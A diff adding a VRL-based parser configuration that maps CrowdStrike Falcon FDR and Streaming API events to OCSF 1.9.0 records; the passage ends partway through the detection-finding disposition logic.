@@ -1,0 +1,1741 @@
+name: crowdstrike_falcon_ocsf
+display_name: CrowdStrike Falcon (OCSF)
+version: "1.3.0"
+description: >
+  Preserves unconsumed parsed fields in redacted, dotted snake_case unmapped keys.
+  Parses CrowdStrike Falcon events in both FDR (flat JSON, dispatched on
+  event_simpleName) and Streaming API (wrapped, dispatched on
+  metadata.eventType) form into complete OCSF 1.9.0 records:
+    ProcessRollup2 / SyntheticProcessRollup2 / WmiCreateProcess -> Process Activity 1007 (Launch)
+    EndOfProcess                                                -> Process Activity 1007 (Terminate)
+    InjectedThread                                              -> Process Activity 1007 (Inject)
+    NetworkConnect/Close/Listen/ReceiveAccept IP4|IP6           -> Network Activity 4001
+    DnsRequest                                                  -> DNS Activity 4003 (Query)
+    PeFileWritten / NewExecutableWritten / GzipFileWritten /
+      NewScriptWritten / DirectoryCreate / CriticalFileAccessed /
+      ImageHash                                                 -> File System Activity 1001
+    AsepValueUpdate                                             -> Registry Value Activity 201002 (win ext, Set)
+    DriverLoad                                                  -> Module Activity 1005 (Load)
+    ServiceStarted                                              -> Windows Service Activity 201004 (win ext, Start)
+    ScheduledTaskRegistered                                     -> Scheduled Job Activity 1006 (Create)
+    ScriptControlScanInfo                                       -> Script Activity 1009 (Execute)
+    UserLogon / UserLogoff / UserLogonFailed(2)                 -> Authentication 3002
+    AuthActivityAuditEvent                                      -> Authentication 3002 (console)
+    UserActivityAuditEvent                                      -> API Activity 6003
+    DetectionSummaryEvent / IncidentSummaryEvent                -> Detection Finding 2004 (Create)
+    InstalledApplication                                        -> Software Inventory Info 5020
+    OsVersionInfo                                               -> Device Inventory Info 5001
+  On findings the detected process is the ACTOR (keeping actor.process.* queryable)
+  and is repeated in evidences[]. Carries metadata.profiles ["host"] (plus
+  "security_control" on findings, which disposition/action are bound to). The OCSF
+  counterpart of parsers/crowdstrike_falcon - deploy one or the other, never both.
+ocsf_version: "1.9.0"
+match_values:
+  - crowdstrike_falcon
+category: endpoint
+vendor: "CrowdStrike"
+product: "Falcon"
+parser_vrl: |
+  # CrowdStrike Falcon (FDR flat JSON + Streaming API wrapped) -> OCSF 1.9.0.
+  # Emits the COMPLETE OCSF record on the root, routed by event_simpleName
+  # (FDR) or metadata.eventType (Streaming API).
+  raw_log = string!(.message)
+  parsed, err = parse_json(raw_log)
+  __source_kv = object(parsed) ?? {}
+  __raw_body = raw_log
+
+  if err != null || !is_object(parsed) {
+      . = {
+          "class_uid": 1007,
+          "class_name": "Process Activity",
+          "category_uid": 1,
+          "category_name": "System Activity",
+          "activity_id": 99,
+          "activity_name": "Other",
+          "type_uid": 100799,
+          "severity_id": 1,
+          "severity": "Informational",
+          "time": 0,
+          "raw_data": raw_log,
+          # 1007 requires actor/device/process even on the unparseable path.
+          "process": { "pid": 0 },
+          "actor": { "process": { "pid": 0 } },
+          "device": { "hostname": "", "type_id": 0 },
+          "metadata": {
+              "version": "1.9.0",
+              "profiles": ["host"],
+              "uid": sha2("crowdstrike_falcon|raw|" + raw_log, variant: "SHA-256"),
+              "log_level": "error",
+              "log_source": "crowdstrike_falcon",
+              "product": { "name": "Falcon", "vendor_name": "CrowdStrike" }
+          }
+      }
+      # NAN-5264: explicit fallback marker; nano parser health counts it.
+      . = set!(., ["unmapped", "parse_fallback"], "unparsable input")
+  } else {
+      root = object!(parsed)
+
+      # ---- Streaming API events wrap the payload in .event and carry the type
+      # in .metadata.eventType; FDR events are flat with .event_simpleName.
+      is_streaming = false
+      streaming_event_type = ""
+      stream_offset = null
+      stream_created_ms = 0
+      if exists(root.metadata.eventType) {
+          is_streaming = true
+          streaming_event_type = to_string(root.metadata.eventType) ?? ""
+          stream_offset = to_int(root.metadata.offset) ?? null
+          stream_created_ms = to_int(root.metadata.eventCreationTime) ?? 0
+      }
+      ev = root
+      if is_streaming && is_object(root.event) { ev = object(root.event) ?? {} }
+
+      event_name = to_string(ev.event_simpleName) ?? ""
+      if event_name == "" { event_name = streaming_event_type }
+
+      # ---- time ---------------------------------------------------------
+      # ContextTimeStamp / ProcessStartTime are epoch SECONDS (often fractional);
+      # timestamp and the streaming eventCreationTime are epoch MILLISECONDS.
+      time_ms = 0
+      ctx_ts = to_float(to_string(ev.ContextTimeStamp) ?? "") ?? 0.0
+      if ctx_ts > 0.0 { time_ms = to_int(ctx_ts * 1000.0) }
+      if time_ms == 0 {
+          raw_ms = to_int(ev.timestamp) ?? 0
+          if raw_ms > 0 { time_ms = raw_ms }
+      }
+      if time_ms == 0 {
+          pst = to_float(to_string(ev.ProcessStartTime) ?? "") ?? 0.0
+          if pst > 0.0 { time_ms = to_int(pst * 1000.0) }
+      }
+      if time_ms == 0 && stream_created_ms > 0 { time_ms = stream_created_ms }
+      # Streaming audit events carry ISO-8601 UTCTimestamp instead.
+      if time_ms == 0 {
+          iso_ts = to_string(ev.UTCTimestamp) ?? ""
+          if iso_ts != "" {
+              t, terr = parse_timestamp(iso_ts, "%+")
+              if terr == null { time_ms = to_unix_timestamp(t, unit: "milliseconds") }
+          }
+      }
+
+      # ---- device -------------------------------------------------------
+      computer = downcase(to_string(ev.ComputerName) ?? "")
+      if computer == "" { computer = downcase(to_string(ev.Hostname) ?? "") }
+      agent_id = to_string(ev.aid) ?? ""
+      if agent_id == "" { agent_id = to_string(ev.AgentIdString) ?? "" }
+      agent_ip = downcase(to_string(ev.aip) ?? "")
+      device = { "hostname": computer, "type_id": 0 }
+      if agent_id != "" { device.uid = agent_id }
+      if agent_ip != "" { device.ip = agent_ip }
+
+      # ---- acting user --------------------------------------------------
+      user_name = downcase(to_string(ev.UserName) ?? "")
+      if user_name == "" { user_name = downcase(to_string(ev.UserId) ?? "") }
+      user_sid = to_string(ev.UserSid) ?? ""
+      if user_sid == "" { user_sid = to_string(ev.FileOperatorSid) ?? "" }
+      actor_user = { "name": user_name }
+      if user_sid != "" { actor_user.uid = user_sid }
+      user_domain = downcase(to_string(ev.LogonDomain) ?? "")
+      if user_domain == "" { user_domain = downcase(to_string(ev.MachineDomain) ?? "") }
+      if user_domain != "" { actor_user.domain = user_domain }
+
+      # ---- hashes (Falcon zero-fills the field when it has no hash) ------
+      file_hashes = []
+      sha256 = downcase(to_string(ev.SHA256HashData) ?? "")
+      if sha256 == "" { sha256 = downcase(to_string(ev.SHA256String) ?? "") }
+      if sha256 != "" && sha256 != "0000000000000000000000000000000000000000000000000000000000000000" {
+          file_hashes = push(file_hashes, { "algorithm_id": 3, "algorithm": "SHA-256", "value": sha256 })
+      }
+      sha1 = downcase(to_string(ev.SHA1HashData) ?? "")
+      if sha1 != "" && sha1 != "0000000000000000000000000000000000000000" {
+          file_hashes = push(file_hashes, { "algorithm_id": 2, "algorithm": "SHA-1", "value": sha1 })
+      }
+      md5 = downcase(to_string(ev.MD5HashData) ?? "")
+      if md5 == "" { md5 = downcase(to_string(ev.MD5String) ?? "") }
+      if md5 != "" && md5 != "00000000000000000000000000000000" {
+          file_hashes = push(file_hashes, { "algorithm_id": 1, "algorithm": "MD5", "value": md5 })
+      }
+
+      # ---- the image-based process --------------------------------------
+      # Detection summaries name it FilePath/FileName instead of ImageFileName.
+      image_path = to_string(ev.ImageFileName) ?? ""
+      if image_path == "" { image_path = to_string(ev.FilePath) ?? "" }
+      image_name = to_string(ev.FileName) ?? ""
+      if image_path != "" {
+          inm, inmerr = parse_regex(image_path, r'(?P<b>[^\\/]+)$')
+          if inmerr == null { image_name = string(inm.b) ?? "" }
+      }
+      proc_file = { "name": image_name, "path": image_path, "type_id": 1 }
+      if length(file_hashes) > 0 { proc_file.hashes = file_hashes }
+
+      proc_pid = to_int(ev.RawProcessId) ?? 0
+      if proc_pid == 0 { proc_pid = to_int(ev.ProcessId) ?? 0 }
+      # TargetProcessId is Falcon's globally-unique process identifier, which is
+      # the right thing for process.uid; RawProcessId is the OS pid.
+      proc_uid = to_string(ev.TargetProcessId) ?? ""
+      image_process = {
+          "name": image_name,
+          "cmd_line": to_string(ev.CommandLine) ?? "",
+          "pid": proc_pid,
+          "file": proc_file
+      }
+      if proc_uid != "" { image_process.uid = proc_uid }
+
+      # ---- the parent process -------------------------------------------
+      parent_path = to_string(ev.ParentImageFileName) ?? ""
+      parent_name = to_string(ev.ParentBaseFileName) ?? ""
+      if parent_path != "" {
+          pnm, pnmerr = parse_regex(parent_path, r'(?P<b>[^\\/]+)$')
+          if pnmerr == null { parent_name = string(pnm.b) ?? "" }
+      }
+      parent_uid = to_string(ev.ParentProcessId) ?? ""
+      parent_process = { "name": parent_name, "cmd_line": to_string(ev.ParentCommandLine) ?? "", "pid": 0 }
+      if parent_path != "" { parent_process.file = { "name": parent_name, "path": parent_path, "type_id": 1 } }
+      if parent_uid != "" { parent_process.uid = parent_uid }
+      has_parent = parent_name != "" || parent_path != "" || parent_uid != ""
+
+      # The process that owns a non-process telemetry event. Falcon only gives
+      # ContextProcessId (its own process identifier), not a pid.
+      ctx_proc_uid = to_string(ev.ContextProcessId) ?? ""
+      context_process = { "pid": 0 }
+      if ctx_proc_uid != "" { context_process = { "uid": ctx_proc_uid, "pid": 0 } }
+      if image_path != "" { context_process = image_process }
+
+      # ---- Windows logon type (shared by the auth branches) --------------
+      logon_type_raw = to_string(ev.LogonType) ?? ""
+      logon_type_id = to_int(ev.LogonType) ?? 0
+      logon_type = "Unknown"
+      if logon_type_id == 2 { logon_type = "Interactive" }
+      if logon_type_id == 3 { logon_type = "Network" }
+      if logon_type_id == 4 { logon_type = "Batch" }
+      if logon_type_id == 5 { logon_type = "OS Service" }
+      if logon_type_id == 7 { logon_type = "Unlock" }
+      if logon_type_id == 8 { logon_type = "Network Cleartext" }
+      if logon_type_id == 9 { logon_type = "New Credentials" }
+      if logon_type_id == 10 { logon_type = "Remote Interactive" }
+      if logon_type_id == 11 { logon_type = "Cached Interactive" }
+      if logon_type == "Unknown" && logon_type_raw != "" { logon_type_id = 99; logon_type = logon_type_raw }
+
+      # ---- defaults; every branch overrides what it needs ----------------
+      class_uid = 1007
+      class_name = "Process Activity"
+      category_uid = 1
+      category_name = "System Activity"
+      activity_id = 99
+      activity_name = "Other"
+      severity_id = 1
+      severity = "Informational"
+      profiles = ["host"]
+
+      ocsf = {}
+
+      if event_name == "ProcessRollup2" || event_name == "SyntheticProcessRollup2" || event_name == "WmiCreateProcess" {
+          # Process create. The NEW process is `process`; its launcher is
+          # `actor.process`.
+          activity_id = 1
+          activity_name = "Launch"
+          ocsf.process = image_process
+          launcher = parent_process
+          if !has_parent { launcher = { "pid": 0 } }
+          ocsf.actor = { "process": launcher, "user": actor_user }
+          ocsf.device = device
+          ocsf.status_id = 1
+          ocsf.status = "Success"
+          ocsf.unmapped = {
+              "event_simple_name": event_name,
+              "integrity_level": to_string(ev.IntegrityLevel) ?? null,
+              "token_type": to_string(ev.TokenType) ?? null,
+              "process_group_id": to_string(ev.ProcessGroupId) ?? null,
+              "authentication_id": to_string(ev.AuthenticationId) ?? null,
+              "sign_info_flags": to_string(ev.SignInfoFlags) ?? null,
+              "source_process_id": to_string(ev.SourceProcessId) ?? null
+          }
+      } else if event_name == "EndOfProcess" {
+          activity_id = 2
+          activity_name = "Terminate"
+          ocsf.process = image_process
+          ocsf.actor = { "user": actor_user }
+          ocsf.device = device
+          ocsf.status_id = 1
+          ocsf.status = "Success"
+          ocsf.unmapped = { "event_simple_name": event_name }
+      } else if event_name == "InjectedThread" {
+          # Thread injection: the injector is the ACTOR, the injected process is
+          # the subject.
+          activity_id = 4
+          activity_name = "Inject"
+          inject_src_path = to_string(ev.InjectingProcessImageFileName) ?? ""
+          inject_src_name = ""
+          ism, ismerr = parse_regex(inject_src_path, r'(?P<b>[^\\/]+)$')
+          if ismerr == null { inject_src_name = string(ism.b) ?? "" }
+          inject_dst_path = to_string(ev.InjectedProcessImageFileName) ?? ""
+          inject_dst_name = ""
+          idm, idmerr = parse_regex(inject_dst_path, r'(?P<b>[^\\/]+)$')
+          if idmerr == null { inject_dst_name = string(idm.b) ?? "" }
+          ocsf.actor = {
+              "process": {
+                  "name": inject_src_name,
+                  "pid": 0,
+                  "uid": to_string(ev.InjectingProcessId) ?? "",
+                  "file": { "name": inject_src_name, "path": inject_src_path, "type_id": 1 }
+              },
+              "user": actor_user
+          }
+          ocsf.process = {
+              "name": inject_dst_name,
+              "pid": 0,
+              "uid": to_string(ev.InjectedProcessId) ?? "",
+              "file": { "name": inject_dst_name, "path": inject_dst_path, "type_id": 1 }
+          }
+          ocsf.device = device
+          ocsf.unmapped = { "event_simple_name": event_name, "injected_thread": to_string(ev.InjectedThread) ?? null }
+      } else if event_name == "NetworkConnectIP4" || event_name == "NetworkConnectIP6" || event_name == "NetworkCloseIP4" || event_name == "NetworkCloseIP6" || event_name == "NetworkListenIP4" || event_name == "NetworkListenIP6" || event_name == "NetworkReceiveAcceptIP4" || event_name == "NetworkReceiveAcceptIP6" {
+          class_uid = 4001
+          class_name = "Network Activity"
+          category_uid = 4
+          category_name = "Network Activity"
+          activity_id = 1
+          activity_name = "Open"
+          if starts_with(event_name, "NetworkClose") { activity_id = 2; activity_name = "Close" }
+          if starts_with(event_name, "NetworkListen") { activity_id = 7; activity_name = "Listen" }
+
+          local_ip = downcase(to_string(ev.LocalAddressIP4) ?? "")
+          if local_ip == "" { local_ip = downcase(to_string(ev.LocalAddressIP6) ?? "") }
+          remote_ip = downcase(to_string(ev.RemoteAddressIP4) ?? "")
+          if remote_ip == "" { remote_ip = downcase(to_string(ev.RemoteAddressIP6) ?? "") }
+          src_ep = { "ip": local_ip, "port": to_int(ev.LocalPort) ?? 0 }
+          if computer != "" { src_ep.hostname = computer }
+          ocsf.src_endpoint = src_ep
+          if remote_ip != "" || exists(ev.RemotePort) {
+              ocsf.dst_endpoint = { "ip": remote_ip, "port": to_int(ev.RemotePort) ?? 0 }
+          }
+
+          # ConnectionDirection: "0" outbound, "1" inbound. Accept events are
+          # inbound by definition.
+          direction_id = 0
+          conn_dir = to_string(ev.ConnectionDirection) ?? ""
+          if conn_dir == "0" { direction_id = 2 }
+          if conn_dir == "1" { direction_id = 1 }
+          if starts_with(event_name, "NetworkReceiveAccept") { direction_id = 1 }
+          if starts_with(event_name, "NetworkListen") { direction_id = 1 }
+          conn_info = { "direction_id": direction_id }
+          proto_num = to_int(ev.Protocol) ?? 0
+          if proto_num > 0 { conn_info.protocol_num = proto_num }
+          ocsf.connection_info = conn_info
+
+          bytes_in = to_int(ev.BytesReceived) ?? 0
+          bytes_out = to_int(ev.BytesSent) ?? 0
+          if bytes_in > 0 || bytes_out > 0 {
+              ocsf.traffic = { "bytes_in": bytes_in, "bytes_out": bytes_out }
+          }
+          ocsf.actor = { "process": context_process, "user": actor_user }
+          ocsf.device = device
+          ocsf.status_id = 1
+          ocsf.status = "Success"
+          ocsf.unmapped = {
+              "event_simple_name": event_name,
+              "connection_flags": to_string(ev.ConnectionFlags) ?? null,
+              "in_context": to_string(ev.InContext) ?? null,
+              "event_origin": to_string(ev.EventOrigin) ?? null
+          }
+      } else if event_name == "DnsRequest" {
+          class_uid = 4003
+          class_name = "DNS Activity"
+          category_uid = 4
+          category_name = "Network Activity"
+          activity_id = 1
+          activity_name = "Query"
+          # 4003 needs at least one endpoint. Falcon observes the query on the
+          # sensor host and does not report the resolver, so the host is the
+          # source endpoint. FirstIP4Record is the RESOLVED address (an answer),
+          # not a DNS server, so it is deliberately NOT dst_endpoint.
+          src_ep = { "hostname": computer }
+          if agent_ip != "" { src_ep.ip = agent_ip }
+          ocsf.src_endpoint = src_ep
+
+          req_type = to_string(ev.RequestType) ?? ""
+          query_type = req_type
+          if req_type == "1" { query_type = "A" }
+          if req_type == "2" { query_type = "NS" }
+          if req_type == "5" { query_type = "CNAME" }
+          if req_type == "6" { query_type = "SOA" }
+          if req_type == "12" { query_type = "PTR" }
+          if req_type == "15" { query_type = "MX" }
+          if req_type == "16" { query_type = "TXT" }
+          if req_type == "28" { query_type = "AAAA" }
+          if req_type == "33" { query_type = "SRV" }
+          if req_type == "65" { query_type = "HTTPS" }
+          query = { "hostname": downcase(to_string(ev.DomainName) ?? "") }
+          if query_type != "" { query.type = query_type }
+          ocsf.query = query
+
+          answers = []
+          ip4_records = to_string(ev.IP4Records) ?? ""
+          if ip4_records != "" { answers = push(answers, { "rdata": ip4_records }) }
+          ip6_records = to_string(ev.IP6Records) ?? ""
+          if ip6_records != "" { answers = push(answers, { "rdata": ip6_records }) }
+          if length(answers) > 0 { ocsf.answers = answers }
+
+          query_status = to_string(ev.QueryStatus) ?? ""
+          if query_status == "0" {
+              ocsf.status_id = 1
+              ocsf.status = "Success"
+          } else if query_status != "" {
+              ocsf.status_id = 2
+              ocsf.status = "Failure"
+              ocsf.status_code = query_status
+          }
+          ocsf.actor = { "process": context_process, "user": actor_user }
+          ocsf.device = device
+          ocsf.unmapped = {
+              "event_simple_name": event_name,
+              "request_type_number": req_type,
+              "dns_request_count": to_int(ev.DnsRequestCount) ?? null
+          }
+      } else if event_name == "GzipFileWritten" || event_name == "NewExecutableWritten" || event_name == "PeFileWritten" || event_name == "NewScriptWritten" || event_name == "DirectoryCreate" || event_name == "CriticalFileAccessed" || event_name == "ImageHash" {
+          class_uid = 1001
+          class_name = "File System Activity"
+          activity_id = 1
+          activity_name = "Create"
+          if event_name == "CriticalFileAccessed" { activity_id = 14; activity_name = "Open" }
+          # ImageHash is the sensor reporting the hash of an image it observed,
+          # not a filesystem mutation -> Other rather than a fabricated Create.
+          if event_name == "ImageHash" { activity_id = 99; activity_name = "Other" }
+
+          target_file = to_string(ev.TargetFileName) ?? ""
+          file_type_id = 1
+          if target_file == "" {
+              target_dir = to_string(ev.TargetDirectoryName) ?? ""
+              if target_dir != "" { target_file = target_dir; file_type_id = 2 }
+          }
+          if target_file == "" { target_file = image_path }
+          if event_name == "DirectoryCreate" { file_type_id = 2 }
+          target_name = ""
+          fnm, fnmerr = parse_regex(target_file, r'(?P<b>[^\\/]+)$')
+          if fnmerr == null { target_name = string(fnm.b) ?? "" }
+          file_obj = { "name": target_name, "path": target_file, "type_id": file_type_id }
+          if length(file_hashes) > 0 { file_obj.hashes = file_hashes }
+          file_size = to_int(ev.Size) ?? 0
+          if file_size > 0 { file_obj.size = file_size }
+          ocsf.file = file_obj
+          ocsf.actor = { "process": context_process, "user": actor_user }
+          ocsf.device = device
+          ocsf.status_id = 1
+          ocsf.status = "Success"
+          ocsf.unmapped = {
+              "event_simple_name": event_name,
+              "file_identifier": to_string(ev.FileIdentifier) ?? null,
+              "is_on_network": to_string(ev.IsOnNetwork) ?? null,
+              "is_on_removable_disk": to_string(ev.IsOnRemovableDisk) ?? null,
+              "content_type": to_string(ev.ContentType) ?? null
+          }
+      } else if event_name == "AsepValueUpdate" {
+          # Autostart registry value written -> Registry Value Activity (win ext).
+          class_uid = 201002
+          class_name = "Registry Value Activity"
+          activity_id = 2
+          activity_name = "Set"
+          ocsf.reg_value = {
+              "name": to_string(ev.TargetObjectName) ?? "",
+              "path": to_string(ev.TargetObjectPath) ?? "",
+              "data": to_string(ev.TargetObjectData) ?? ""
+          }
+          ocsf.actor = { "process": context_process, "user": actor_user }
+          ocsf.device = device
+          ocsf.unmapped = { "event_simple_name": event_name, "asep_class": to_string(ev.AsepClass) ?? null }
+      } else if event_name == "DriverLoad" {
+          # A kernel driver load is a module load, not a process launch.
+          class_uid = 1005
+          class_name = "Module Activity"
+          activity_id = 1
+          activity_name = "Load"
+          module_file = { "name": image_name, "path": image_path, "type_id": 1 }
+          if length(file_hashes) > 0 { module_file.hashes = file_hashes }
+          ocsf.module = { "load_type_id": 1, "load_type": "Standard", "file": module_file }
+          ocsf.actor = { "process": context_process, "user": actor_user }
+          ocsf.device = device
+          ocsf.unmapped = { "event_simple_name": event_name, "sign_info_flags": to_string(ev.SignInfoFlags) ?? null }
+      } else if event_name == "ServiceStarted" {
+          class_uid = 201004
+          class_name = "Windows Service Activity"
+          activity_id = 3
+          activity_name = "Start"
+          svc_name = to_string(ev.ServiceDisplayName) ?? ""
+          if svc_name == "" { svc_name = to_string(ev.ServiceObjectName) ?? "" }
+          ocsf.win_service = {
+              "name": svc_name,
+              "cmd_line": to_string(ev.ServiceImagePath) ?? "",
+              "service_start_name": to_string(ev.ServiceObjectName) ?? ""
+          }
+          ocsf.actor = { "process": context_process, "user": actor_user }
+          ocsf.device = device
+          ocsf.unmapped = {
+              "event_simple_name": event_name,
+              "service_type": to_string(ev.ServiceType) ?? null,
+              "service_start_type": to_string(ev.ServiceStartType) ?? null
+          }
+      } else if event_name == "ScheduledTaskRegistered" {
+          class_uid = 1006
+          class_name = "Scheduled Job Activity"
+          activity_id = 1
+          activity_name = "Create"
+          job = { "name": to_string(ev.TaskName) ?? "", "cmd_line": to_string(ev.TaskExecCommand) ?? "" }
+          task_author = to_string(ev.TaskAuthor) ?? ""
+          if task_author != "" { job.user = { "name": downcase(task_author) } }
+          ocsf.job = job
+          ocsf.actor = { "process": context_process, "user": actor_user }
+          ocsf.device = device
+          ocsf.unmapped = {
+              "event_simple_name": event_name,
+              "task_exec_arguments": to_string(ev.TaskExecArguments) ?? null
+          }
+      } else if event_name == "ScriptControlScanInfo" {
+          class_uid = 1009
+          class_name = "Script Activity"
+          activity_id = 1
+          activity_name = "Execute"
+          script_name = to_string(ev.ScriptContentName) ?? ""
+          script_type_id = 99
+          script_type = "Other"
+          sname_l = downcase(script_name)
+          if ends_with(sname_l, ".ps1") || ends_with(sname_l, ".psm1") { script_type_id = 2; script_type = "PowerShell" }
+          if ends_with(sname_l, ".bat") || ends_with(sname_l, ".cmd") { script_type_id = 1; script_type = "Windows Command Prompt" }
+          if ends_with(sname_l, ".py") { script_type_id = 3; script_type = "Python" }
+          if ends_with(sname_l, ".js") { script_type_id = 4; script_type = "JavaScript" }
+          if ends_with(sname_l, ".vbs") { script_type_id = 5; script_type = "VBScript" }
+          if ends_with(sname_l, ".sh") { script_type_id = 6; script_type = "Unix Shell" }
+          # OCSF 1.9 types script_content as a Long String object, not a string.
+          script_obj = {
+              "script_content": { "value": to_string(ev.ScriptContent) ?? "" },
+              "type_id": script_type_id,
+              "type": script_type
+          }
+          if script_name != "" { script_obj.name = script_name }
+          ocsf.script = script_obj
+          ocsf.actor = { "process": context_process, "user": actor_user }
+          ocsf.device = device
+          ocsf.unmapped = {
+              "event_simple_name": event_name,
+              "script_content_source": to_string(ev.ScriptContentSource) ?? null
+          }
+      } else if event_name == "UserLogon" || event_name == "UserLogoff" || event_name == "UserLogonFailed" || event_name == "UserLogonFailed2" {
+          class_uid = 3002
+          class_name = "Authentication"
+          category_uid = 3
+          category_name = "Identity & Access Management"
+          activity_id = 1
+          activity_name = "Logon"
+          if event_name == "UserLogoff" { activity_id = 2; activity_name = "Logoff" }
+
+          ocsf.user = actor_user
+          # 3002 requires one of service/dst_endpoint; the logon lands on this host.
+          ocsf.dst_endpoint = { "hostname": computer }
+          remote_ip = downcase(to_string(ev.RemoteAddressIP4) ?? "")
+          if remote_ip != "" { ocsf.src_endpoint = { "ip": remote_ip } }
+
+          if event_name == "UserLogonFailed" || event_name == "UserLogonFailed2" {
+              ocsf.status_id = 2
+              ocsf.status = "Failure"
+              severity_id = 2
+              severity = "Low"
+              logon_status = to_string(ev.Status) ?? ""
+              if logon_status != "" { ocsf.status_code = logon_status }
+          } else {
+              ocsf.status_id = 1
+              ocsf.status = "Success"
+          }
+
+          if logon_type_raw != "" {
+              ocsf.logon_type_id = logon_type_id
+              ocsf.logon_type = logon_type
+              ocsf.is_remote = logon_type_id == 3 || logon_type_id == 8 || logon_type_id == 10
+              ocsf.is_cleartext = logon_type_id == 8
+          }
+          pkg = downcase(to_string(ev.AuthenticationPackage) ?? "")
+          if pkg != "" {
+              auth_protocol_id = 99
+              if pkg == "ntlm" { auth_protocol_id = 1 }
+              if pkg == "kerberos" { auth_protocol_id = 2 }
+              ocsf.auth_protocol_id = auth_protocol_id
+              ocsf.auth_protocol = to_string(ev.AuthenticationPackage) ?? ""
+          }
+          logon_id = to_string(ev.LogonId) ?? ""
+          if logon_id != "" { ocsf.session = { "uid": logon_id } }
+          ocsf.actor = { "user": actor_user }
+          ocsf.device = device
+          ocsf.unmapped = {
+              "event_simple_name": event_name,
+              "logon_server": to_string(ev.LogonServer) ?? null,
+              "user_is_admin": to_string(ev.UserIsAdmin) ?? null,
+              "remote_account": to_string(ev.RemoteAccount) ?? null,
+              "sub_status": to_string(ev.SubStatus) ?? null
+          }
+      } else if event_name == "AuthActivityAuditEvent" {
+          # Falcon console authentication (Streaming API audit stream).
+          class_uid = 3002
+          class_name = "Authentication"
+          category_uid = 3
+          category_name = "Identity & Access Management"
+          activity_id = 1
+          activity_name = "Logon"
+          operation = to_string(ev.OperationName) ?? ""
+          if downcase(operation) == "userlogout" { activity_id = 2; activity_name = "Logoff" }
+          ocsf.user = { "name": downcase(to_string(ev.UserId) ?? "") }
+          # The console is the service being authenticated to; there is no
+          # destination host, so `service` (not dst_endpoint) satisfies 3002.
+          service_name = to_string(ev.ServiceName) ?? ""
+          if service_name == "" { service_name = "crowdstrike-falcon-console" }
+          ocsf.service = { "name": service_name }
+          user_ip = downcase(to_string(ev.UserIp) ?? "")
+          if user_ip != "" { ocsf.src_endpoint = { "ip": user_ip } }
+          audit_success = downcase(to_string(ev.Success) ?? "")
+          if audit_success == "false" {
+              ocsf.status_id = 2
+              ocsf.status = "Failure"
+              severity_id = 2
+              severity = "Low"
+          } else {
+              ocsf.status_id = 1
+              ocsf.status = "Success"
+          }
+          ocsf.actor = { "user": { "name": downcase(to_string(ev.UserId) ?? "") } }
+          ocsf.unmapped = { "event_simple_name": event_name, "operation_name": operation }
+      } else if event_name == "UserActivityAuditEvent" {
+          # Falcon console/API administrative action.
+          class_uid = 6003
+          class_name = "API Activity"
+          category_uid = 6
+          category_name = "Application Activity"
+          operation = to_string(ev.OperationName) ?? ""
+          op_l = downcase(operation)
+          activity_id = 99
+          activity_name = "Other"
+          if contains(op_l, "create") { activity_id = 1; activity_name = "Create" }
+          if contains(op_l, "read") || contains(op_l, "get") || contains(op_l, "list") { activity_id = 2; activity_name = "Read" }
+          if contains(op_l, "update") || contains(op_l, "modify") { activity_id = 3; activity_name = "Update" }
+          if contains(op_l, "delete") || contains(op_l, "remove") { activity_id = 4; activity_name = "Delete" }
+          api_obj = { "operation": operation }
+          service_name = to_string(ev.ServiceName) ?? ""
+          if service_name != "" { api_obj.service = { "name": service_name } }
+          ocsf.api = api_obj
+          ocsf.actor = { "user": { "name": downcase(to_string(ev.UserId) ?? "") } }
+          user_ip = downcase(to_string(ev.UserIp) ?? "")
+          ocsf.src_endpoint = { "ip": user_ip }
+          ocsf.status_id = 1
+          ocsf.status = "Success"
+          ocsf.unmapped = { "event_simple_name": event_name, "operation_name": operation }
+      } else if event_name == "DetectionSummaryEvent" || event_name == "IncidentSummaryEvent" {
+          class_uid = 2004
+          class_name = "Detection Finding"
+          category_uid = 2
+          category_name = "Findings"
+          activity_id = 1
+          activity_name = "Create"
+          profiles = ["host", "security_control"]
+
+          # Falcon Severity is 1-5 on detections; incidents carry FineScore 0-100.
+          sev_num = to_int(ev.Severity) ?? 0
+          risk_level_id = 0
+          risk_level = "Info"
+          if sev_num >= 5 {
+              severity_id = 5; severity = "Critical"; risk_level_id = 4; risk_level = "Critical"
+          } else if sev_num == 4 {
+              severity_id = 4; severity = "High"; risk_level_id = 3; risk_level = "High"
+          } else if sev_num == 3 {
+              severity_id = 3; severity = "Medium"; risk_level_id = 2; risk_level = "Medium"
+          } else if sev_num == 2 {
+              severity_id = 2; severity = "Low"; risk_level_id = 1; risk_level = "Low"
+          }
+          ocsf.risk_level_id = risk_level_id
+          ocsf.risk_level = risk_level
+          fine_score = to_int(ev.FineScore) ?? 0
+          if fine_score > 0 {
+              ocsf.risk_score = fine_score
+          } else if sev_num > 0 {
+              ocsf.risk_score = sev_num * 20
+          }
+
+          finding_uid = to_string(ev.DetectId) ?? ""
+          if finding_uid == "" { finding_uid = to_string(ev.IncidentId) ?? "" }
+          if finding_uid == "" { finding_uid = to_string(ev.CompositeId) ?? "" }
+          if finding_uid == "" { finding_uid = sha2("crowdstrike_falcon|raw|" + raw_log, variant: "SHA-256") }
+          title = to_string(ev.DetectName) ?? ""
+          if title == "" { title = to_string(ev.IncidentType) ?? "" }
+          if title == "" { title = event_name }
+          finding_types = []
+          ioc_type = to_string(ev.IOCType) ?? ""
+          if ioc_type != "" { finding_types = push(finding_types, ioc_type) }
+          finding_types = push(finding_types, event_name)
+          finding_info = {
+              "uid": finding_uid,
+              "title": title,
+              "types": finding_types,
+              "data_sources": ["crowdstrike_falcon"],
+              "analytic": {
+                  "name": title,
+                  "uid": finding_uid,
+                  "type_id": 2,
+                  "type": "Behavioral"
+              }
+          }
+          detect_desc = to_string(ev.DetectDescription) ?? ""
+          if detect_desc != "" { finding_info.desc = detect_desc }
+          ocsf.finding_info = finding_info
+          ocsf.is_alert = true
+
+          # The detected process is the ACTOR of the finding (and keeps
+          # actor.process.* queryable); it is repeated in evidences[].
+          ocsf.actor = { "process": image_process, "user": actor_user }
+          local_ip = downcase(to_string(ev.LocalIP) ?? "")
+          if local_ip != "" { device.ip = local_ip }
+          ocsf.device = device
+          evidence = { "process": image_process, "device": device }
+          if has_parent { evidence.actor = { "process": parent_process } }
+          ocsf.evidences = [evidence]
+
+          # PatternDispositionDescription tells us whether Falcon acted.
+          pattern_disp = downcase(to_string(ev.PatternDispositionDescription) ?? "")
+          disposition_id = 15
+          disposition = "Detected"
+          action_id = 3
+          action = "Observed"
+          if contains(pattern_disp, "prevent") || contains(pattern_disp, "block") || contains(pattern_disp, "kill") || contains(pattern_disp, "terminat") {
+              disposition_id = 2; disposition = "Blocked"; action_id = 2; action = "Denied"
